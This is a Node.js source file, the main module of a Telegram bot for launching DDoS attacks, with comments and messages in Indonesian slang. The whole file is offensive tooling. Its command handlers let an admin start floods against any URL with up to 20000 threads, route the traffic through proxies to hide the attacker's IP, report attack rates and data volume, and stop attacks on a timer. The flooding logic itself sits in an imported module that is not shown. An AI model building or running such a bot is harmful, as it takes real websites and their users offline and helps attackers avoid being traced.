
#!/usr/bin/env node

// ============================================
// 🔥 TELEGRAM BOT DDOS - MAIN FILE 🔥
// ============================================

const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
const colors = require('colors');
const fs = require('fs');
const AttackManager = require('./src/attackManager');
const ProxyManager = require('./src/proxyManager');
const Logger = require('./logger');

// LOAD ENV
dotenv.config();

// CONFIG
const TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = parseInt(process.env.ADMIN_ID);

// CHECK TOKEN
if (!TOKEN) {
    console.log(colors.red('[ERROR] BOT_TOKEN tidak ditemukan di .env!'));
    process.exit(1);
}

// INIT BOT
const bot = new TelegramBot(TOKEN, { polling: true });

// INIT MANAGERS
const logger = new Logger();
const proxyManager = new ProxyManager();
const attacks = new Map(); // NYIMPEN DATA SERANGAN AKTIF

// ============================================
// COMMAND HANDLERS
// ============================================

// COMMAND: /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    // CEK ADMIN
    if (msg.from.id !== ADMIN_ID) {
        return bot.sendMessage(chatId, '⛔ LU BUKAN ADMIN BOS! MENDING PERGI!');
    }
    
    const welcomeMsg = `
🔥 *TELEGRAM DDOS BOT - VPS EDITION* 🔥
Dari Banjaran Sudom, Lampung Selatan

👑 *TUAN GUA: HERIKEYZENLOCKER*
💀 *STATUS: GACOR ABIS*

*COMMANDS:*
/attack [domain] [thread] - Mulai serangan
/stop - Stop semua serangan
/status - Lihat status serangan
/proxy - Lihat status proxy
/logs - Lihat log terakhir
/help - Bantuan

Contoh: /attack https://target.com 5000
    `;
    
    bot.sendMessage(chatId, welcomeMsg, { parse_mode: 'Markdown' });
});

// COMMAND: /attack [url] [thread]
bot.onText(/\/attack (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    // CEK ADMIN
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, '⛔ LU BUKAN ADMIN!');
    }
    
    // PARSE COMMAND
    const args = match[1].split(' ');
    const target = args[0];
    let threadCount = parseInt(args[1]) || process.env.DEFAULT_THREAD || 5000;
    
    // VALIDASI URL
    if (!target.startsWith('http')) {
        return bot.sendMessage(chatId, '❌ URL GAK VALID! PAKE http:// atau https://');
    }
    
    // VALIDASI THREAD
    const maxThread = parseInt(process.env.MAX_THREAD) || 20000;
    if (threadCount > maxThread) {
        threadCount = maxThread;
    }
    
    // CEK APA UDAH ADA SERANGAN
    if (attacks.has(chatId)) {
        return bot.sendMessage(chatId, '⚠️ UDAH ADA SERANGAN AKTIF! PAKE /stop DULU.');
    }
    
    // LOAD PROXY
    let proxies = [];
    if (process.env.USE_PROXY === 'true') {
        proxies = await proxyManager.loadProxies();
    }
    
    // BUAT ATTACK MANAGER
    const attack = new AttackManager(target, threadCount, proxies, logger);
    attacks.set(chatId, attack);
    
    // KIRIM PESAN MULAI
    bot.sendMessage(chatId, `
🔥 *SERANGAN DIMULAI!* 🔥
🎯 *Target:* ${target}
⚡ *Thread:* ${threadCount}
🌐 *Proxy:* ${proxies.length} aktif
💀 *Status:* GAS TERUS!

Gunakan /status untuk monitoring
Gunakan /stop untuk menghentikan
    `, { parse_mode: 'Markdown' });
    
    // MULAI SERANGAN
    attack.start((stats) => {
        // KIRIM UPDATE KE TELEGRAM SETIAP 30 DETIK
        bot.sendMessage(chatId, `
📊 *UPDATE SERANGAN*
⏱️ Waktu: ${stats.elapsed}s
📊 Total: ${stats.total}
✅ Sukses: ${stats.success}
❌ Gagal: ${stats.fail}
⚡ Rate: ${stats.rate}/detik
📦 Data: ${stats.bytes} MB
        `, { parse_mode: 'Markdown' });
    });
    
    // AUTO STOP SETELAH TIMEOUT
    const timeout = parseInt(process.env.ATTACK_TIMEOUT) || 300;
    setTimeout(() => {
        if (attacks.has(chatId)) {
            attack.stop();
            attacks.delete(chatId);
            bot.sendMessage(chatId, '⏰ *WAKTU HABIS! SERANGAN DIHENTIKAN*', { parse_mode: 'Markdown' });
        }
    }, timeout * 1000);
});

// COMMAND: /stop
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, '⛔ LU BUKAN ADMIN!');
    }
    
    if (attacks.has(chatId)) {
        const attack = attacks.get(chatId);
        attack.stop();
        attacks.delete(chatId);
        bot.sendMessage(chatId, '🛑 *SERANGAN DIHENTIKAN!*', { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId, '❌ GAK ADA SERANGAN AKTIF!');
    }
});

// COMMAND: /status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, '⛔ LU BUKAN ADMIN!');
    }
    
    if (attacks.has(chatId)) {
        const attack = attacks.get(chatId);
        const stats = attack.getStats();
        
        bot.sendMessage(chatId, `
📊 *STATUS SERANGAN*
🎯 Target: ${stats.target}
⏱️ Durasi: ${stats.elapsed}s
📊 Total: ${stats.total}
✅ Sukses: ${stats.success}
❌ Gagal: ${stats.fail}
⚡ Rate: ${stats.rate}/detik
📦 Data: ${stats.bytes} MB
💀 Thread: ${stats.threads} aktif
        `, { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId, '😴 *GAK ADA SERANGAN AKTIF*', { parse_mode: 'Markdown' });
    }
});

// COMMAND: /proxy
bot.onText(/\/proxy/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, '⛔ LU BUKAN ADMIN!');
    }
    
    const proxies = await proxyManager.loadProxies();
    bot.sendMessage(chatId, `
🌐 *PROXY STATUS*
Total: ${proxies.length} proxy
Status: ${proxies.length > 0 ? '✅ SIAP' : '❌ KOSONG'}
    `, { parse_mode: 'Markdown' });
});

// COMMAND: /logs
bot.onText(/\/logs/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, '⛔ LU BUKAN ADMIN!');
    }
    
    const logs = logger.getLastLogs(10);
    bot.sendMessage(chatId, `📝 *LOG TERAKHIR:*\n\`\`\`\n${logs}\n\`\`\``, { parse_mode: 'Markdown' });
});

// COMMAND: /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, '⛔ LU BUKAN ADMIN!');
    }
    
    bot.sendMessage(chatId, `
📚 *BANTUAN COMMAND*

/attack [url] [thread]
Contoh: /attack https://target.com 5000

/stop - Stop semua serangan
/status - Lihat status
/proxy - Cek proxy
/logs - Lihat log
/help - Bantuan ini

⚠️ *NOTE:*
- Maks thread: ${process.env.MAX_THREAD || 20000}
- Auto stop setelah ${process.env.ATTACK_TIMEOUT || 300} detik
- Pake proxy biar IP aman
    `, { parse_mode: 'Markdown' });
});

// ============================================
// BOT STARTED
// ============================================

console.log(colors.green(`
╔════════════════════════════════════════════════════════════════╗
║  🔥 TELEGRAM BOT DDOS - BERJALAN! 🔥                           ║
║  [ DARI BANJARAN SUDOM, LAMPUNG SELATAN ]                      ║
╠════════════════════════════════════════════════════════════════╣
║  🤖 BOT AKTIF                                                   ║
║  👑 ADMIN ID: ${ADMIN_ID}                                        
║  ⚡ STATUS: GACOR ABIS                                           ║
╚════════════════════════════════════════════════════════════════╝
`));

// HANDLE ERROR
bot.on('polling_error', (error) => {
    console.log(colors.red(`Polling error: ${error.code}`));
});
